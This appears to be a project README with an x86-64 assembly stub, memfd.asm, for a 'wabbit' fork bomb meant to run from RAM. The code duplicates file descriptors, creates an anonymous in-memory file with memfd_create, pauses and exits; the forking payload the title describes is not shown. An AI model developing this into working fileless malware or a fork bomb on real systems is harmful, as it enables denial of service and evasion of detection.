# Gaslit_Wabbit
1978 wabbit fork bomb running in Ram


### memfd.asm
```asm
BITS 64
global _start
section .text
_start:
        xor rax, rax
        xor rdi, rdi
        mov di, 10
        mov rax, 0x20
        syscall
        xor rax, rax
        inc rdi
        mov rax, 0x20
        syscall
memfd_create:
        push 0x78436f73
        mov rdi, rsp
        mov rsi, 0
        mov rax, 319
        syscall
pause:
        mov rax, 34
        syscall
exit:
        xor rax, rax
        add rax, 60
        xor rdi, rdi
        syscall
```